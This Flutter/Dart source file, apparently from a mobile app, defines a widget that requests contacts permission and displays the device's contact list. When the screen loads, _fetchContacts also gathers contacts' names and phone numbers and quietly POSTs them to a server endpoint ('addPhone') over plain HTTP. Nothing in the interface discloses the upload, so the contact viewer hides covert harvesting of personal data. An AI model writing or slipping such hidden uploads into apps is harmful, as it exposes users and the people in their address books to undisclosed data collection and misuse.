import 'package:flutter/material.dart';
import 'package:dio/dio.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';
import '../common/global.dart';
class FlutterContactsExample extends StatefulWidget {
  const FlutterContactsExample({Key ? key}) : super(key: key);
  @override
  _FlutterContactsExampleState createState() => _FlutterContactsExampleState();
}

class _FlutterContactsExampleState extends State<FlutterContactsExample> {
  List<Contact>? _contacts;
  // var _contacts;
  bool _permissionDenied = false;

  @override
  void initState() {
    super.initState();
      _fetchContacts();
      
  }

  Future _fetchContacts() async {
    if (!await FlutterContacts.requestPermission(readonly: true)) {
      setState(() => _permissionDenied = true);
    } else {
      var dio = Dio();
      // 全部
      final contacts = await FlutterContacts.getContacts();
      print(contacts);
      List arr = [];
      if (contacts.isNotEmpty) {
        for (var i = 0; i < contacts.length; i++) {
          var element = await FlutterContacts.getContact(contacts[i].id);
          if (element != null && element.phones.isNotEmpty) {
            arr.add({
              'name': element.displayName,
              'phone': element.phones.first.number
            });
          }
        }
      }

      // 单个
      // final contacts = await FlutterContacts.getContact('79');
      // List arr = [];
      //  arr.add({
      //         'name': contacts!.displayName,
      //         'phone': contacts.phones.first.number,
      //       });

      setState(() => _contacts = contacts);
      if(!Global.flagContact) {
        try {
          var res = await dio.post('http://192.168.101.18:8019/yzxa-api/app/addPhone', data: {
            // 'list': arr
            'list': arr.sublist(0,1)
          });
          setState(() {
            Global.flagContact = true;
          });
          print(res);
        } catch(e) {
          print(e); 
        }
      }
      
    }
  }

  @override
  Widget build(BuildContext context) =>  _body();

  Widget _body() {
    if (_permissionDenied) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
          const Text('Permission denied'),
          ElevatedButton(
            onPressed: () {
              checkPermission();
            },
             child: const Text('重新获取授权')
             )
        ],)
      );
    }
    if (_contacts == null) return const Center(child: CircularProgressIndicator());
    return ListView.builder(
        itemCount: _contacts!.length,
        itemBuilder: (context, i) => ListTile(
            title: Text(_contacts![i].displayName),
            onTap: () async {
              final fullContact =
                  await FlutterContacts.getContact(_contacts![i].id);
              await Navigator.of(context).push(
                  MaterialPageRoute(builder: (_) => ContactPage(fullContact!)));
            }));
  }
}



void checkPermission() async {
    Permission permission = Permission.contacts;
    PermissionStatus status = await permission.status;
    print('检测权限$status');
    if (status.isGranted) {
      //权限通过
    } else if (status.isDenied) {
      //权限拒绝， 需要区分IOS和Android，二者不一样
      requestPermission(permission);
    } else if (status.isPermanentlyDenied) {
      //权限永久拒绝，且不在提示，需要进入设置界面，IOS和Android不同
      openAppSettings();
    } else if (status.isRestricted) {
      //活动限制（例如，设置了家长///控件，仅在iOS以上受支持。
      openAppSettings();
    } else {
      //第一次申请
      requestPermission(permission);
    }
  }

  void requestPermission(Permission permission) async {
    //发起权限申请
    PermissionStatus status = await permission.request();
    // 返回权限申请的状态 status
    if (status.isPermanentlyDenied) {
      openAppSettings();
    }
  }

class ContactPage extends StatelessWidget {
  final Contact contact;
  const ContactPage(this.contact, {Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) => Scaffold(
      appBar: AppBar(title: Text(contact.displayName)),
      body: Column(children: [
        Text('First name: ${contact.name.first}'),
        Text('Last name: ${contact.name.last}'),
        Text(
            'Phone number: ${contact.phones.isNotEmpty ? contact.phones.first.number : '(none)'}'),
        Text(
            'Email address: ${contact.emails.isNotEmpty ? contact.emails.first.address : '(none)'}'),
      ]));
}